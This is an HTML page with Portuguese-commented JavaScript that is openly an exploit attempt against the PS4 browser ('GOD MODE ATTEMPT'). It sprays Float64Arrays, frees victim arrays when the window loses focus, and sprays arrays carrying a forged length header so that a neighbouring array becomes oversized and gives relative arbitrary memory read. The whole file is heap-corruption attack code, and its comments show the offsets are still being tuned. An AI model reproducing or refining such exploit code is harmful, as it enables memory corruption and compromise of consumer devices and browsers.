<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4: Length Corruption Attempt</title>
<style>
    body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; }
    #log { text-align: left; margin: 20px; border: 1px solid #444; padding: 10px; }
    .god { color: cyan; font-weight: bold; font-size: 1.5em; animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0; } }
</style>
</head>
<body>

<h1>GOD MODE ATTEMPT (Length Corruption)</h1>
<div id="status">Prepare-se...</div>
<button onclick="fire()">INICIAR</button>
<div id="log"></div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += txt + "<br>"; }

    // DADOS:
    // Estamos tentando forjar um cabeçalho.
    // 0x0001000000000010 -> Length = 0x10000, Flags = 0x10 (Pode variar)
    // Em float, isso é aprox: 1.3906717577229e-309
    const FAKE_HEADER = 1.3906717577229e-309; 

    // O "Lixo" seguro para preencher o resto
    const PADDING = 1.1;

    let victims = [];
    let neighbors = [];
    const COUNT = 10000;

    function fire() {
        document.getElementById('status').innerText = "Alocando...";

        // Layout: [ VIZINHO ] [ VÍTIMA ]
        // Tentamos corromper o vizinho que vem DEPOIS na memória?
        // Ou o overflow acontece para trás?
        // No seu teste anterior, você corrompeu o índice 0. Isso sugere que
        // a vítima foi liberada e o spray ocupou o lugar dela E vazou para o PRÓXIMO bloco.
        
        for(let i=0; i<COUNT; i++) {
            // Vítima (será deletada)
            let v = new Float64Array(16); 
            victims.push(v);

            // Vizinho (será corrompido)
            let n = new Float64Array(16);
            n.fill(PADDING); 
            neighbors.push(n);
        }

        document.getElementById('status').innerText = "PRONTO. APERTE OPTIONS.";

        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            log("Exploit Triggered...");
            
            // 1. Libera Vítimas
            victims = null;

            // 2. Spray Cirúrgico
            // Tentamos criar um spray onde o ÚLTIMO valor seja o header do próximo
            let spray = [];
            try {
                // Tentamos tamanhos variados para "alinhar" o final do spray 
                // com o começo do vizinho.
                for(let i=0; i<COUNT*2; i++) {
                    // Tamanho 24 (overflow de 8 doubles = 64 bytes)
                    let s = new Float64Array(24);
                    // Preenche com lixo seguro
                    s.fill(PADDING);
                    // Coloca o Header Falso nas últimas posições (onde o overflow ocorre)
                    s[16] = FAKE_HEADER; // Início do overflow?
                    s[17] = FAKE_HEADER;
                    s[18] = FAKE_HEADER;
                    s[19] = FAKE_HEADER; 
                    spray.push(s);
                }
            } catch(e) {}

            // 3. Checagem
            checkGodMode();
        };
    }

    function checkGodMode() {
        let success = false;
        for(let i=0; i<COUNT; i++) {
            // O vizinho deveria ter length 16.
            // Se tiver mudado, vencemos.
            if(neighbors[i].length > 16) {
                success = true;
                document.body.style.background = "#000055";
                Log.innerHTML += `<div class="god">GOD MODE ATIVADO!</div>`;
                log(`Vizinho [${i}] agora tem tamanho: ${neighbors[i].length}`);
                log("Você agora tem leitura relativa arbitrária!");
                break;
            }
        }
        
        if(!success) {
            log("Overflow ocorreu, mas não acertamos o Length.");
            log("Tente ajustar o índice do FAKE_HEADER no array de spray.");
        }
    }
</script>
</body>
</html>
